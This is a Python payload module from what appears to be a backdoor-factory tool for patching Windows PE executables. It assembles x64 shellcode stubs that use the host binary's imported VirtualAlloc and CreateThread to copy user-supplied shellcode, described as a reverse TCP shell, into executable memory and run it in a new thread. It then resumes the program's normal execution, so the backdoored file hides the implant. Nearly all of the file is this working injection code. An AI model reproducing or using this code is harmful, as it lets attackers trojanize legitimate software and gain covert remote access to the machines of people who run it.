import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)

class iat_user_supplied_shellcode_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_user_supplied_shellcode_threaded"
        self.description = """Import Address Table reverse tcp shell """
        self.requirements = {'MODE': 'How the patching will happen',
                             'SUPPLIED_SHELLCODE': 'User supplied shellcode in raw format',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                                   "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55"
                                   "\x41\x56\x41\x57\x9c"
                                   , 'iso-8859-1')
        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41"
                                  "\x5b\x41\x5a\x41\x59\x41\x58\x5d\x5c\x5f"
                                  "\x5e\x5a\x59\x5b\x58"
                                  , 'iso-8859-1')
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                            b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'staged'

    def invoke(self, PM):
        # Expose patching method objects

        self.PM = PM
        #no encoders for this payload
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False

        return self.run()

    def run(self):

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                logger.error(f"API not found: {api}")
                return False

        self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #get_payload:  #Jump back with the address for the payload on the stack.
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            self.shellcode2 = b"\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 99).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 99).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 71).rstrip('L')), 16))
        else:
            self.shellcode2 = b"\xE8\xBA\xFF\xFF\xFF"

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']
            else:
                self.shellcode2 += b"\x41" * 90

        self.shellcode2 += self.supplied_shellcode


        #allocate
        self.shellcode1 = b"\xfc"
        self.shellcode1 += b"\x49\xBE"                                       # mov value below to r14

        if self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['AddressOfEntryPoint'] + self.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['AddressOfEntryPoint'] + self.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['AddressOfEntryPoint'] + self.BDF.pe_object['ImageBase']))

        # RDX holds entry point
        self.shellcode1 += b"\x49\x01\xD6"                                   # add r14 + RDX
        self.shellcode1 += b"\x49\xBF"                                       # mov value below to r15
        if self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['AddressOfEntryPoint'] + self.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['AddressOfEntryPoint'] + self.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['AddressOfEntryPoint'] + self.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x49\x01\xD7"                                   # add r15 + RDX

        # r14 virtualalloc
        # r15 createthread

        self.shellcode1 += bytes("\x5d"                                          # pop rbp
                            "\x49\xc7\xc5"                                  # mov r13, size of payload...
                            , 'iso-8859-1')
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += bytes("\x6a\x40"                                      # push 40h
                            "\x41\x59"                                      # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"                          # push 1000h
                            "\x41\x58"                                      # pop r8.. now 1000h
                            "\x4C\x89\xEA"                                  # mov rdx, r13
                            "\x6A\x00"                                      # push 0
                            "\x59"                                          # pop rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x16"                                  # call qword ptr [r14]
                            "\x48\x89\xc3"                                  # mov rbx, rax      ; Store allocated address in rbx
                            "\x48\x89\xc7"                                  # mov rdi, rax      ; Prepare RDI with the new address
                            , 'iso-8859-1')
        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x41"

                            # got_payload:
        self.shellcode1 += bytes("\x5e"                                          # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                                      # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                          # call set_handler   ; Configure error handling
                            #^^^^ I could delete this need to fix jmp, call, and stack
                            #set_handler:
                            "\x48\x31\xC0"                                  # xor rax,rax
                            "\x50"                                          # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                          # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                                  # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]
                            "\x48\x83\xC4\x50"                              # add rsp, 50
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            , 'iso-8859-1')

        #Jump to the win64 return to normal execution code segment.
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)
